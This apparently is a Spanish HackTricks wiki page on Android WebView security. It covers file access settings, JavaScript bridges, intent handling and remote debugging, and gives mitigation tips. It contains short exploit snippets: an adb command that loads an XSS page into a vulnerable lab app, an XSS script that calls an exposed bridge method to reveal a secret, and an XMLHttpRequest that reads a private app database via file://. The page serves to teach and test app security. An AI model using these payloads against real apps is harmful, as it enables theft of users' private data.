# Ataques a WebView

<details>

<summary><strong>Aprende a hackear AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Gu铆a sobre Configuraciones y Seguridad de WebView

### Resumen de Vulnerabilidades de WebView

Un aspecto cr铆tico del desarrollo de Android implica el manejo correcto de WebViews. Esta gu铆a destaca configuraciones clave y pr谩cticas de seguridad para mitigar los riesgos asociados con el uso de WebView.

![Ejemplo de WebView](<../../.gitbook/assets/image (1190).png>)

### **Acceso a Archivos en WebViews**

Por defecto, las WebViews permiten el acceso a archivos. Esta funcionalidad est谩 controlada por el m茅todo `setAllowFileAccess()`, disponible desde el nivel de API de Android 3 (Cupcake 1.5). Las aplicaciones con el permiso **android.permission.READ\_EXTERNAL\_STORAGE** pueden leer archivos desde el almacenamiento externo utilizando un esquema de URL de archivo (`file://ruta/al/archivo`).

#### **Funciones Obsoletas: Acceso Universal y Acceso a Archivos Desde URLs**

* **Acceso Universal Desde URLs de Archivo**: Esta funci贸n obsoleta permit铆a solicitudes entre dominios desde URLs de archivo, lo que representaba un riesgo de seguridad significativo debido a posibles ataques XSS. La configuraci贸n predeterminada est谩 deshabilitada (`false`) para aplicaciones dirigidas a Android Jelly Bean y versiones m谩s nuevas.
* Para verificar esta configuraci贸n, utiliza `getAllowUniversalAccessFromFileURLs()`.
* Para modificar esta configuraci贸n, utiliza `setAllowUniversalAccessFromFileURLs(boolean)`.
* **Acceso a Archivos Desde URLs de Archivo**: Esta funci贸n, tambi茅n obsoleta, controlaba el acceso a contenido desde otras URLs de esquema de archivo. Al igual que el acceso universal, su configuraci贸n predeterminada est谩 deshabilitada para una mayor seguridad.
* Utiliza `getAllowFileAccessFromFileURLs()` para verificar y `setAllowFileAccessFromFileURLs(boolean)` para establecer.

#### **Carga Segura de Archivos**

Para deshabilitar el acceso al sistema de archivos y seguir accediendo a activos y recursos, se utiliza el m茅todo `setAllowFileAccess()`. Con Android R y versiones posteriores, la configuraci贸n predeterminada es `false`.

* Verifica con `getAllowFileAccess()`.
* Habilita o deshabilita con `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

La clase **WebViewAssetLoader** es el enfoque moderno para cargar archivos locales. Utiliza URLs http(s) para acceder a activos y recursos locales, aline谩ndose con la pol铆tica de mismo origen, facilitando as铆 la gesti贸n de CORS.

### loadUrl

Esta es una funci贸n com煤n utilizada para cargar URLs arbitrarias en un webview:
```java
webview.loadUrl("<url here>")
```
Por supuesto, un posible atacante nunca deber铆a poder **controlar la URL** que una aplicaci贸n va a cargar.

### **JavaScript y Manejo de Esquemas de Intenci贸n**

* **JavaScript**: Deshabilitado de forma predeterminada en WebViews, se puede habilitar a trav茅s de `setJavaScriptEnabled()`. Se recomienda precauci贸n, ya que habilitar JavaScript sin las debidas precauciones puede introducir vulnerabilidades de seguridad.
* **Esquema de Intenci贸n**: Las WebViews pueden manejar el esquema `intent`, lo que potencialmente puede llevar a explotaciones si no se maneja cuidadosamente. Un ejemplo de vulnerabilidad involucr贸 un par谩metro expuesto de WebView "support\_url" que podr铆a ser explotado para ejecutar ataques de scripting entre sitios (XSS).

![WebView Vulnerable](<../../.gitbook/assets/image (1191).png>)

Ejemplo de explotaci贸n usando adb:

{% code overflow="wrap" %}
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView es support_url "https://example.com/xss.html"
```
{% endcode %}

### Puente de JavaScript

Android proporciona una caracter铆stica que permite que **JavaScript** en un WebView invoque **funciones de aplicaciones nativas de Android**. Esto se logra utilizando el m茅todo `addJavascriptInterface`, que integra JavaScript con funcionalidades nativas de Android, denominado como un _puente de JavaScript de WebView_. Se recomienda precauci贸n, ya que este m茅todo permite que todas las p谩ginas dentro del WebView accedan al objeto de Interfaz de JavaScript registrado, lo que representa un riesgo de seguridad si se expone informaci贸n sensible a trav茅s de estas interfaces.

* **Se requiere extrema precauci贸n** para aplicaciones dirigidas a versiones de Android por debajo de 4.2 debido a una vulnerabilidad que permite la ejecuci贸n de c贸digo remoto a trav茅s de JavaScript malicioso, explotando la reflexi贸n.

#### Implementaci贸n de un Puente de JavaScript

* Las **interfaces de JavaScript** pueden interactuar con el c贸digo nativo, como se muestra en los ejemplos donde se expone un m茅todo de clase a JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
* JavaScript Bridge se habilita agregando una interfaz al WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```
* Posible explotaci贸n a trav茅s de JavaScript, por ejemplo, mediante un ataque XSS, permite llamar a m茅todos Java expuestos:
```html
<script>alert(javascriptBridge.getSecret());</script>
```
* Para mitigar riesgos, **restrinja el uso del puente JavaScript** al c贸digo enviado con el APK y evite cargar JavaScript desde fuentes remotas. Para dispositivos m谩s antiguos, establezca el nivel m铆nimo de API en 17.

### Ejecuci贸n de C贸digo Remoto (RCE) basada en Reflexi贸n

* Un m茅todo documentado permite lograr RCE a trav茅s de la reflexi贸n al ejecutar una carga 煤til espec铆fica. Sin embargo, la anotaci贸n `@JavascriptInterface` evita el acceso no autorizado a m茅todos, limitando la superficie de ataque.

### Depuraci贸n Remota

* La **depuraci贸n remota** es posible con **Chrome Developer Tools**, lo que permite la interacci贸n y la ejecuci贸n arbitraria de JavaScript dentro del contenido de WebView.

#### Habilitar la Depuraci贸n Remota

* La depuraci贸n remota se puede habilitar para todos los WebViews dentro de una aplicaci贸n mediante:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
* Para habilitar condicionalmente la depuraci贸n basada en el estado de depuraci贸n de la aplicaci贸n:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrar archivos arbitrarios

* Demuestra la exfiltraci贸n de archivos arbitrarios utilizando un XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## Referencias

* [https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
* [https://github.com/authenticationfailure/WheresMyBrowser.Android](https://github.com/authenticationfailure/WheresMyBrowser.Android)
* [https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView)
* [https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
* [https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
